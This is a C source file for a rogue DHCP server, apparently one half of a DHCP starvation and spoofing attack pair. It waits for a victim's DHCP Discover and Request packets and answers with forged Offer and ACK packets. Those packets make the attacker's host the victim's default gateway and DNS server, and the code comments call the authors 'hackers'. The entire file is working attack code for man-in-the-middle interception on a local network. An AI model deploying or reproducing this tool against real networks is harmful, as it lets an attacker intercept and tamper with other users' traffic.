#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<net/if.h> //Ifreq
#include<sys/ioctl.h> //Ifreq

#include "fake_DHCP.h"

int debug = 1;

char my_interface[] = "enp0s3";
char fake_ip_offer[] = "10.0.2.111"; //Ip that will be proposed to a discovery_packet
char fake_default_gateway[] = "10.0.2.1"; //Default_gateway should be our ip_adress -> router
char fake_dhcp_ip[] = "10.0.2.15";
//char dns_ip[] = "129.104.201.59";
char dns_ip[] = "10.0.2.15";



//Store the information of discovery packet
struct dhcp_packet d_packet;



int main(int argc, char *argv[]) {
	//CREATE SOCKET
	if (debug) printf("===== START CREATION SOCKET =====\n");
	int sockfd = create_socket();
	if (sockfd < 0) {
		printf("ERROR : SOCKET CREATION\n");
	};
	if (debug) printf("===== END CREATION SOCKET =====\n");

	if (debug) printf("===== START OFFER STEP =====\n");
	//Wait to receive a broadcast packet discovery and send back an offer
	if (send_offer(sockfd) != 0) {
		printf("ERROR : RECEIVE DISCOVERY/SEND OFFER\n");
	};
	if (debug) printf("===== END OFFER STEP =====\n");


	if (debug) printf("===== START ACK STEP =====\n");
	//Wait for receive a broadcast packet request and send back an acknowledgement
	if (send_ack(sockfd) != 0) {
		printf("ERROR : RECEIVE REQUEST/SEND ACK\n");
	};
	if (debug) printf("===== END ACK STEP =====\n");

};


int create_socket() {

	int sockfd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
	struct sockaddr_in hdcp_addr;
	memset(&hdcp_addr, 0, sizeof(hdcp_addr));
	hdcp_addr.sin_family = AF_INET;
	hdcp_addr.sin_port = htons(SERVER_PORT);
	hdcp_addr.sin_addr.s_addr = INADDR_ANY;
	//inet_pton(AF_INET, &fake_hdcp_ip_adress[0], &(hdcp_addr.sin_addr)); // Ip adress adding

	int flag = 1;
	setsockopt(sockfd,SOL_SOCKET,SO_REUSEADDR,(char *)&flag,sizeof(flag));
	setsockopt(sockfd,SOL_SOCKET,SO_BROADCAST,(char *)&flag,sizeof(flag)); //ERROR : SEND DISCOVERY MESSAGE if not

	bind(sockfd, (struct sockaddr *) &hdcp_addr, sizeof(struct sockaddr));

	return sockfd;
};


int send_offer(int sockfd) {

	//RECEIVE THE DISCOVERY PACKET
	struct dhcp_packet discovery_packet;
	memset(&discovery_packet, 0, sizeof(discovery_packet));
	struct sockaddr_in from; // set "from" (client)
	memset(&from,0,sizeof(from));
	socklen_t fromlen = sizeof(struct sockaddr);

	int not_discovery_packet = 1;

	while (not_discovery_packet) {
		int received_size = recvfrom(sockfd, &discovery_packet, sizeof(discovery_packet), 0, (struct sockaddr*) &from, &fromlen);

		/* We have to make sure the message is a DISCOVERY + not a discovery from our starvor */


		//Is it an DHCP Discovery ?
		if (discovery_packet.dp_options[4] != 53 || discovery_packet.dp_options[6] != 1) {
			//I don't why, 35 but not 53 according to wireshark packets
			continue;
		};

		//Ok it looks it is a DHCP Discovery. But isn't the DHCP starvor ? --> Compare Client MAC address
		if (discovery_packet.dp_chaddr[0] == 111 && discovery_packet.dp_chaddr[1] == 111) {
			//I don't why, 35 but not 53 according to wireshark packets
			continue;
		};

		not_discovery_packet = 0;

	};
	if (debug) {
		printf("Discovery Packet received !\n");
		print_packet(discovery_packet);
	};
	//Store the mac address of the victim and the transaction id
	memcpy(&d_packet , &discovery_packet, sizeof(struct dhcp_packet) );


	//SEND BACK AN OFFER CONFIGURATION
	//set IP offer
	struct dhcp_packet offer_packet;
	if ( config_packet( &offer_packet, 2 ) != 0 ) {
		printf("ERROR : CONFIG PACKET\n");
	};

	//Set the destination addr
	struct sockaddr_in dest_client; //Destination adresse (in broadcast mode)
	memset(&dest_client,0,sizeof(dest_client));
	dest_client.sin_family = AF_INET;
	dest_client.sin_port = htons(CLIENT_PORT);
	dest_client.sin_addr.s_addr = INADDR_BROADCAST; //255.255.255.255

	int sent_size = sendto(sockfd, (char *)&offer_packet, sizeof(offer_packet), 0,(struct sockaddr *) &dest_client,sizeof(dest_client));
	if (sent_size < 0) {
		return 1;
	};

	if (debug) print_packet(offer_packet);
	printf("[Offer Packet] Succesfully sent size : %d\n", sent_size);
	return 0;

};


int send_ack(int sockfd) {


	//RECEIVE THE REQUEST PACKET
	//We just make sure to receive and stock the packet in request_packet but request_packet will never be used
	struct dhcp_packet request_packet;
	memset(&request_packet, 0, sizeof(request_packet));
	struct sockaddr_in from; // set "from" (client)
	memset(&from,0,sizeof(from));
	socklen_t fromlen = sizeof(struct sockaddr);

	int not_request_packet = 1;

	while (not_request_packet) {
		int received_size = recvfrom(sockfd, &request_packet, sizeof(request_packet), 0, (struct sockaddr*) &from, &fromlen);

		/* Make sure the message is a request_packet + it's come from the right client */

		//Is it an DHCP request ?
		if (request_packet.dp_options[4] != 53 || request_packet.dp_options[6] != 3) {
			//I don't why, 35 but not 53 according to wireshark packets
			continue;
		};


		not_request_packet = 0;
		//Compare the MAC adress with the one who send the discovert packet the before
		for (int i = 0; i < 6 ; i++) {
			if ( request_packet.dp_chaddr[i] != d_packet.dp_chaddr[i]) not_request_packet = 1;
		};

	};
	if (debug) {
		printf("Request Packet received !\n");
		print_packet(request_packet);
	};






	//SEND BACK AN OFFER CONFIGURATION
	//set IP offer
	struct dhcp_packet ack_packet;
	if ( config_packet( &ack_packet, 5 ) != 0 ) {
		printf("ERROR : CONFIG PACKET\n");
	};

	//Set the destination addr
	struct sockaddr_in dest_client; //Destination adresse (in broadcast mode)
	memset(&dest_client,0,sizeof(dest_client));
	dest_client.sin_family = AF_INET;
	dest_client.sin_port = htons(CLIENT_PORT);
	dest_client.sin_addr.s_addr = INADDR_BROADCAST; //255.255.255.255

	int sent_size = sendto(sockfd, (char *)&ack_packet, sizeof(ack_packet), 0,(struct sockaddr *) &dest_client,sizeof(dest_client));
	if (sent_size < 0) {
		return 1;
	};

	if (debug) print_packet(ack_packet);
	printf("[Acknowledgement Packet] Succesfully sent size : %d\n", sent_size);
	return 0;



};


int config_packet( struct dhcp_packet *sent_packet, int type_message ) {

	int n1, n2, n3, n4;

	if (debug) printf("Configuring pack of type %d", type_message);

	//FILL ALL THE PACKET INFORMATION
	memcpy( sent_packet, &d_packet, sizeof(struct dhcp_packet));
	sent_packet->dp_op = 2; // 1 for request ; 2 for reply
	inet_pton(AF_INET, &fake_ip_offer[0], &(sent_packet->dp_yiaddr));// Give the fake ip address
	inet_pton(AF_INET, &fake_dhcp_ip[0], &(sent_packet->dp_siaddr));// Server IP address

	//FILL THE OPTIONS FIELD --> Options mean in fact additional information
	/*When used with BOOTP, the first four octets of the vendor information
	  field have been assigned to the "magic cookie" (as suggested in RFC
	  951).  This field identifies the mode in which the succeeding data is
	  to be interpreted.  The value of the magic cookie is the 4 octet
	  dotted decimal 99.130.83.99 (or hexadecimal number 63.82.53.63) in
	  network byte order.*/
		// More info --> https://datatracker.ietf.org/doc/html/rfc2132
	memset(&sent_packet->dp_options,0,312);
	sent_packet->dp_options[0] = '\x63';
	sent_packet->dp_options[1] = '\x82';
	sent_packet->dp_options[2] = '\x53';
	sent_packet->dp_options[3] = '\x63';

	sscanf(fake_dhcp_ip, "%d.%d.%d.%d", &n1, &n2, &n3, &n4);
	sent_packet->dp_options[4] = 54; //DHCP Server Identifier
	sent_packet->dp_options[5] = '\x04';//Length
	sent_packet->dp_options[6] = n1;// First octet
	sent_packet->dp_options[7] = n2;// Second octet
	sent_packet->dp_options[8] = n3;// Third octet
	sent_packet->dp_options[9] = n4;// Last octet

	//DHCP message type is identified
	sent_packet->dp_options[10] = 53;    // DHCP message type option identifier --> 53 is DHCP message type
	sent_packet->dp_options[11] = '\x01';  // DHCP message option length in bytes
	sent_packet->dp_options[12] = type_message; //Message type++ --> 2 for a dhcp offer
									// More info --> https://www.iana.org/assignments/bootp-dhcp-parameters/bootp-dhcp-parameters.xhtml

	//Set the subnet mask : 255.255.255.0
	sent_packet->dp_options[13] = 1; //1 for subnet mask
	sent_packet->dp_options[14] = '\x04';// Subnet mask length in bytes
	sent_packet->dp_options[15] = 0xFF;// First octet
	sent_packet->dp_options[16] = 0xFF;// Second octet
	sent_packet->dp_options[17] = 0xFF;// Third octet
	sent_packet->dp_options[18] = 0x00;// Last octet

	//Set the default Gateway --> toward us (because we are hackers)
	sscanf(fake_default_gateway, "%d.%d.%d.%d", &n1, &n2, &n3, &n4);
	sent_packet->dp_options[19] = 3; //3 for routers
	sent_packet->dp_options[20] = '\x04'; //Length
	sent_packet->dp_options[21] = n1;// First octet
	sent_packet->dp_options[22] = n2;// Second octet
	sent_packet->dp_options[23] = n3;// Third octet
	sent_packet->dp_options[24] = n4;// Last octet

	//DNS
	sscanf(dns_ip, "%d.%d.%d.%d", &n1, &n2, &n3, &n4);
	sent_packet->dp_options[25] = 6; //DNS
	sent_packet->dp_options[26] = '\x04'; //Length
	sent_packet->dp_options[27] = n1;// First octet
	sent_packet->dp_options[28] = n2;// Second octet
	sent_packet->dp_options[29] = n3;// Third octet
	sent_packet->dp_options[30] = n4;// Last octet

	//lease time
	sent_packet->dp_options[31] = 51; //Lease time
	sent_packet->dp_options[32] = '\x04'; //Length
	sent_packet->dp_options[35] = 20;
	sent_packet->dp_options[36] = 20;

	//END
	sent_packet->dp_options[37] = 0xFF;// Third octet


	return 0;


};





void print_packet(struct dhcp_packet packet) {
	printf("\n\n######### PRINT DHCP PACKET ########### \n\n");
	printf("Opcode tupe (op) : %d\n", packet.dp_op);
	printf("Hardware addr type (htype) : %d\n", packet.dp_htype);
	printf("Hardware addr lenght (hlen) : %d\n", packet.dp_hlen);
	printf("Gatewat hops (hops) : %d\n", packet.dp_hops);
	printf("Transaction ID (xID) : %lu\n", (unsigned long)packet.dp_xid);
	printf("Seconds since boot began ID (secs) : %lu\n", (unsigned long)packet.dp_secs);
	printf("Flags (flags) : %lu\n", (unsigned long)packet.dp_flags);
	printf("Client IP address (ciaddr):  %s\n",inet_ntoa(packet.dp_ciaddr));
	printf("Your IP address (yiaddr):  %s\n",inet_ntoa(packet.dp_yiaddr));
	printf("Server IP address (siaddr):  %s\n",inet_ntoa(packet.dp_siaddr));
	printf("Gateway IP address (giaddr):  %s\n",inet_ntoa(packet.dp_giaddr));
	printf("Client hardware address (chaddr):  %u\n",packet.dp_chaddr);
	printf("Server host name (sname):  %u\n",packet.dp_sname);
	printf("Boot file name (file):  %u\n",packet.dp_file);
	//printf("Options (options):  %u\n",packet.dp_options);
	printf("Type message (options[6]):  %u\n",packet.dp_options[4]);
	printf("DHCP type message (options[6]):  %u\n",packet.dp_options[6]);
	printf("\n\n");
};























///
